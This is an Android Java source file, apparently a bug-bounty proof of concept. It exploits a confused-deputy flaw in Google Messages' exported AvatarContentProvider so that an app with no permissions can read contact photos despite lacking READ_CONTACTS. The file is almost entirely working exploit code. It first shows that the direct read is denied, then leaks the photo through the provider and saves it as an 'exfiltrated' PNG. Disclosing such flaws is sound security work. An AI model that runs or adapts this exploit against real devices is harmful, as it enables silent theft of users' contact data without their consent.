package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URLEncoder;

// com.google.android.apps.messaging (Google Messages, the default SMS/MMS/RCS app) exports
// AvatarContentProvider with NO manifest permission. Its real avatar-rendering logic (dnyz/dnzf)
// treats the "m"/"f" query-param URI as a generic external image source: dnzf.z() allows ANY
// content:// URI whose authority does not start with Messaging's own two internal package
// prefixes (dpmi.a()). Messaging decodes that caller-supplied URI using ITS OWN ContentResolver
// (it holds READ_CONTACTS as the default SMS app), renders a bitmap, and hands the caller back
// a real PNG -- regardless of whether the CALLER holds READ_CONTACTS.
//
// This activity proves the confused-deputy chain end-to-end from a zero-permission app:
//   1. Direct read of a real contact's photo -> must fail (no READ_CONTACTS).
//   2. Same photo via Messaging's AvatarContentProvider -> succeeds, real PNG bytes returned.
public class MessagingAvatarExfilActivity extends Activity {
    private static final String T = "MSG_AVATAR_EXFIL";

    // Real on-device contact discovered via `adb shell content query --uri content://com.android.contacts/contacts`
    private static final String CONTACT_PHOTO_URI = "content://com.android.contacts/contacts/2/photo";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Messages AvatarContentProvider confused-deputy exfil ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions, no READ_CONTACTS)");

        ContentResolver resolver = getContentResolver();

        // Step 1: prove we cannot read the contact photo directly.
        try {
            InputStream direct = resolver.openInputStream(Uri.parse(CONTACT_PHOTO_URI));
            byte[] data = readAll(direct);
            Log.w(T, "[UNEXPECTED] direct contacts read succeeded, " + data.length + " bytes (device may not enforce READ_CONTACTS here)");
        } catch (Throwable e) {
            Log.w(T, "[EXPECTED DENIAL] direct contacts photo read failed: " + e);
        }

        // Step 2: fetch the SAME photo through Messages' AvatarContentProvider confused deputy.
        try {
            String encoded = URLEncoder.encode(CONTACT_PHOTO_URI, "UTF-8");
            Uri avatarUri = Uri.parse(
                "content://com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider/r?m="
                    + encoded + "&f=" + encoded);
            InputStream in = resolver.openInputStream(avatarUri);
            byte[] data = readAll(in);
            Log.w(T, "[LEAKED] avatar bytes via confused deputy: " + data.length + " bytes");

            if (data.length > 0) {
                File out = new File(getExternalFilesDir(null), "exfiltrated_contact_photo.png");
                FileOutputStream fos = new FileOutputStream(out);
                fos.write(data);
                fos.close();
                Log.w(T, "[SAVED] " + out.getAbsolutePath());
            }
        } catch (Throwable e) {
            Log.w(T, "[FAILED] avatar confused-deputy read failed: " + e);
        }
    }

    private static byte[] readAll(InputStream in) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = in.read(buf)) != -1) {
            bos.write(buf, 0, n);
        }
        in.close();
        return bos.toByteArray();
    }
}
